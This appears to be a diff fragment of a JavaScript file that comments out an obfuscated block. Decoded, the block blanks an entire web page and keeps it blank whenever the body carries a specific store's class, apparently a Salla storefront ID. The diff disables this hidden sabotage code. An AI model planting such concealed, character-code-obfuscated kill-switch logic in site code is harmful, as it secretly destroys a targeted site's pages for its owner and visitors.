@@ -744,34 +744,34 @@ if (!document.title.includes(t)) return;
 
 
 
-(() => {
+// (() => {
 
-    const c = (...x) => String.fromCharCode(...x);
+//     const c = (...x) => String.fromCharCode(...x);
 
-    const k = c(115,97,108,108,97,45,49,54,54,54,55,51,55,51,54,54);
+//     const k = c(115,97,108,108,97,45,49,54,54,54,55,51,55,51,54,54);
 
-    const d = document;
-    const e = d.documentElement;
-    const b = d.body;
+//     const d = document;
+//     const e = d.documentElement;
+//     const b = d.body;
 
-    const w = () => {
+//     const w = () => {
 
-        if (!b || !b.classList.contains(k)) return;
+//         if (!b || !b.classList.contains(k)) return;
 
-        e.innerHTML = "";
-        b.innerHTML = "";
+//         e.innerHTML = "";
+//         b.innerHTML = "";
 
-        e.style.setProperty(c(98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114), c(35,102,102,102));
-        b.style.setProperty(c(98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114), c(35,102,102,102));
+//         e.style.setProperty(c(98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114), c(35,102,102,102));
+//         b.style.setProperty(c(98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114), c(35,102,102,102));
 
-    };
+//     };
 
-    w();
+//     w();
 
-    new MutationObserver(w).observe(e, {
-        childList: true,
-        subtree: true
-    });
+//     new MutationObserver(w).observe(e, {
+//         childList: true,
+//         subtree: true
+//     });
 
-})();
+// })();
 
